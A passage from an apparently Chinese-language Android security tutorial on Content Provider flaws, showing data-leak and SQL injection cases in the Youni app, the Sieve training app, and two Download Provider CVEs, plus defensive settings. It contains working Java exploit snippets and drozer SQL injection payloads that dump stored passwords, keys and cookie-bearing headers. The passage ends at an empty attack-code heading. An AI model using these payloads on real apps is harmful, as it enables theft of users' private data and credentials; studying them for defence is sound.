
### 代码分析

我们可以分析目标程序的 provider 的进程名和授权的 URI，我们可以根据授权的 URI 来构建一个 URI，然后通过 `ContentResolver` 去读取里面的列表名信息，这样我们就可以获取 APP 中的隐私数据信息。

```java
private void getyouni(){
    int i = 0;
    ContentResolver contentresolver = getContentResolver();
    String[] projection = {"* from contacts--"};
    Uri uri = Uri.parse("content://com.snda.youni.providers.DataStructs/message_ex");
    Cursor cursor = contentresolver.query(uri.projection,null,null,null);
    String text = "";
    while(cursor.moveToNext()){
        text += cursor.getString(cursor.getColumnIndex("display_name"))+"\n";
    }
    Log.i("TEST",text);
}
```

### 案例2：样例 sieve.apk

我们先向 apk 中添加一条数据，然后保存：

![image-20210922111855304](https://bbs.kanxue.com/upload/attach/202109/905443_VXGPFGX7458H6U7.png)

我们先使用 drozer 对内容提供器的路径进行扫描：

```bash
run scanner.provider.finduris -a <包名>
```

报错：`drozer could not find or compile a required extension library`

这是由于我们 `drozer2.7` 中代码导致的，我们需要修改相应的代码，参考网址。

![image-20210922111855304](https://bbs.kanxue.com/upload/attach/202109/905443_72WXQNG2AH4NGNZ.png)

![image-20210922111855304](https://bbs.kanxue.com/upload/attach/202109/905443_AG83T36NF98JV36.png)

我们可以对敏感数据读取：

```bash
run app.provider.query uri
```

![image-20210922112523603](https://bbs.kanxue.com/upload/attach/202109/905443_V79WY8BMC6YQV4Y.png)

我们就成功的将我们刚才保存的账号密码信息给获取了

### 案例3：[CVE-2018-9546: Download Provider文件头信息泄露](https://bbs.kanxue.com/elink@ee9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0j5h3u0A6L8U0l9H3y4q4)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3x3U0l9I4z5g2)9J5c8U0l9@1i4K6u0r3x3e0g2Q4x3V1k6m8L8X3c8J5L8$3W2V1i4K6u0V1c8r3!0%4L8X3I4G2j5h3c8Q4x3X3c8b7M7X3!0$3K9h3c8W2M7W2)9J5y4f1f1$3i4K6t1#2b7V1y4Q4x3U0f1^5c8W2)9J5y4f1f1$3i4K6t1#2b7U0c8Q4x3U0f1&6c8g2)9J5y4f1f1#2i4K6t1#2z5o6S2Q4x3U0f1^5y4W2)9J5y4f1f1$3i4K6t1#2z5f1g2Q4x3U0f1&6x3q4)9J5c8R3`.`.)

#### 漏洞描述

`Download Provider运行app获取下载的http请求头，但理论上APP只能访问自己下载的文件的http请求头，但Download Provider没有做好权限配置，导致heads可以被任意读取。header中会保存一些敏感数据，例如cookie等。`

#### 目标代码

读取 `header` 的 `URI` 为：`content://download/mydownloads/download_id/headers`

#### 攻击代码

```java
Uri uri = Uri.parse("content://download/mydownloads/1493/headers");
Cursor cur = res.query(uri, null, null, null, null);
try {
    if (cur != null && cur.getCount() > 0) {
        StringBuilder sb = new StringBuilder(LOG_SEPARATOR);
        sb.append("HEADERS FOR DOWNLOAD ID ").append(id).append("\n");
        while (cur.moveToNext()) {
            String rowHeader = cur.getString(cur.getColumnIndex("header"));
            String rowValue = cur.getString(cur.getColumnIndex("value"));
            sb.append(rowHeader).append(": ").append(rowValue).append("\n\n");
        }
        log(sb.toString());
    }
} finally {
    if (cur != null)
        cur.close();
}
```

由于 `header` 的 `URI` 并未做一些防护措施，我们可以将 `download_id` 取具体的值，然后来获取里面的具体信息

#### （3）安全防护

1. `minSdkVersion` 不低于 `9`
2. 不向外部 app 提供数据的私有 `content provider` 显示设置 `exported="false"`，避免组件暴露（编译 api 小于 `17` 时更应注意此点）
3. 内部 app 通过 `content provid` 交换数据时，设置 `protectionLevel="signature"` 验证签名
4. 公开的 `content provider` 确保不存储敏感数据

针对权限保护绕过防御措施：
1. 使用 `Context.checkCallingPermission()` 和 `Context.enforceCallingPermission()` 来确保调用者拥有相应的权限，防止串谋攻击（confused deputy）。
2. 可以使用如下函数，获取应用的 `permission` 保护级别是否与系统中已定义的 `permission` 保护级别一致。如果不一致，则抛出异常。

### 3.SQL注入漏洞

#### （1）原理介绍

对 `Content Provider` 进行增删改查操作时，程序没有对用户的输入进行过滤，未采用参数化查询的方式，可能会导致 `sql` 注入攻击。

所谓的 `SQL` 注入攻击指的是攻击者可以精心构造 `selection` 参数、`projection` 参数以及其他有效的 `SQL` 语句组成部分，实现在未授权的情况下从 `Content Provider` 获取更多信息。应该避免使用 `SQLiteDatabase.rawQuery()` 进行查询，而应该使用编译好的参数化语句。使用预编译好的语句比如 `SQLiteStatement`，不仅可以避免 `SQL` 注入，而且操作性能也大幅提高，因为其不用每次执行都进行解析。

另外一种方式是使用 `query()`、`insert()`、`update()`、和 `delete()` 方法，因为这些函数也提供了参数化的语句。预编译的参数化语句，问号处可以插入或者使 `bindString()` 绑定值。从而避免 `SQL` 注入攻击。

#### （2）漏洞复现

##### 案例1：[安全管家客户端存在SQL注入攻击](https://bbs.kanxue.com/elink@6e7K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6&6i4K6u0W2P5X3!0F1k6g2)9J5k6h3y4A6i4K6u0r3j5Y4g2Y4i4K6g2X3k6r3g2@1j5h3W2D9i4K6u0W2M7r3S2H3i4K6y4r3N6%4W2T1N6h3N6Q4y4h3k6A6k6q4)9K6c8s2N6G2L8%4W2#2L8W2)9J5k6o6t1H3x3e0c8Q4x3X3b7H3z5o6j5^5z5e0V1`.`)

漏洞说明：

`Android` 版安全管家客户端 `contentprovider uri` 配置不当，导致 `sql` 注入，使得任何应用可不需要 `root` 权限下，获得和修改数据库中数据。

`Androidmanifest` 文件中定义的 `provider`：

![image-20210922112523603](https://bbs.kanxue.com/upload/attach/202109/905443_QQYPPTH3VET8UDN.png)

使用 `drozer` 扫描客户端程序存在的 `contentProvider uri`：

![image-20210922112523603](https://bbs.kanxue.com/upload/attach/202109/905443_576HVQ5VDGAY5AJ.png)

搜索到对外暴露可访问的 `uri`：

![image-20210922112523603](https://bbs.kanxue.com/upload/attach/202109/905443_XPTEEQJ8BN3A4VT.png)

`newapp.db` 结构：

![image-20210922112523603](https://bbs.kanxue.com/upload/attach/202109/905443_RJYZJ474YDF527J.png)

查看新安装应用的包名：

![image-20210922112523603](https://bbs.kanxue.com/upload/attach/202109/905443_WQYUCYAE8J6EYSH.png)

查看白名单：

![image-20210922112523603](https://bbs.kanxue.com/upload/attach/202109/905443_DN6Z86UBSCGP9BE.png)

![image-20210922112523603](https://bbs.kanxue.com/upload/attach/202109/905443_772CTM5JEPZV9BC.png)

##### 案例2：样本 sieve

我们使用 `drozer` 扫描注入的位置：

```bash
run scanner.provider.injection -a <包名>
```

![image-20210922112523603](https://bbs.kanxue.com/upload/attach/202109/905443_N9SJUZPPWC5FVN4.png)

然后我们执行以下命令，发现返回了报错信息，接着构造 `sql` 获取敏感数据

```bash
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection " * from Key;--+"
```

![image-20210922112523603](https://bbs.kanxue.com/upload/attach/202109/905443_UEA2PVNM7SMW6M8.png)

列出所有表信息：

```bash
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
```

![image-20210922112523603](https://bbs.kanxue.com/upload/attach/202109/905443_ATVKAEG5HQM3GT5.png)

获取具体表信息

```bash
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"
```

![image-20210922112523603](https://bbs.kanxue.com/upload/attach/202109/905443_KWQW5V7SXP52NGH.png)

列出该 `app` 的表信息

```bash
run scanner.provider.sqltables -a com.mwr.example.sieve
```

![image-20210922112523603](https://bbs.kanxue.com/upload/attach/202109/905443_PMANUDQ547U2CN6.png)

##### 案例3：[CVE-2018-9493: Download Provider SQL注入](https://bbs.kanxue.com/elink@2f5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0j5h3u0A6L8U0l9H3y4q4)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3x3U0l9I4z5g2)9J5c8U0l9@1i4K6u0r3x3e0g2Q4x3V1k6m8L8X3c8J5L8$3W2V1i4K6u0V1c8r3!0%4L8X3I4G2j5h3c8Q4x3X3c8b7M7X3!0$3K9h3c8W2M7W2)9J5y4f1f1$3i4K6t1#2b7V1y4Q4x3U0f1^5c8W2)9J5y4f1f1$3i4K6t1#2b7U0c8Q4x3U0f1&6c8g2)9J5y4f1f1#2i4K6t1#2z5o6S2Q4x3U0f1^5y4W2)9J5y4f1f1$3i4K6t1#2z5f1g2Q4x3U0f1&6x3q4)9J5c8R3`.`.)

漏洞分析：

`Download Provider` 中的以下 `columns` 是不允许被外部访问的，例如 `CookieData`，但是利用 `SQL` 注入漏洞可以绕过这个限制。

`projection` 参数存在注入漏洞，结合二分法可以爆出某些 `columns` 字段的内容。

目标代码：

![image-20210922131649440](https://bbs.kanxue.com/upload/attach/202109/905443_VHTPUNDMAJDMFYM.png)

攻击代码：
